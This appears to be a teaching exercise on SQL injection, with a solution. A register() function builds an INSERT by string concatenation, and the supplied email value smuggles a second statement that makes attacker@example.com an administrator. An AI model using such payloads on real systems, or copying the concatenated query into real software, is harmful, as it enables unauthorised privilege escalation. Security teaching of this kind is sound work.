// Here's a code problem:

// Use a SQL injection attack to make attacker@example.com an administrator. (Note: our code here also inserts an innocent user. After the attack is executed, the innocent user shouldn't be an admin, so you'll need a WHERE on your UPDATE. The final SELECT here will return both users: attacker and innocent.)

exec(`CREATE TABLE users (email TEXT, admin INTEGER NOT NULL DEFAULT 0)`)
exec(`INSERT INTO users (email) VALUES ('innocent@example.com')`)

function register(email) {
  exec(`INSERT INTO users (email) VALUES ('` + email + `')`)
}

register(
  "attacker@example.com'); UPDATE users SET admin = 1 WHERE email = 'attacker@example.com';--"
)

exec(`SELECT * FROM users`)

// GOAL: [{email: 'innocent@example.com', admin: 0}, {email: 'attacker@example.com', admin: 1}]
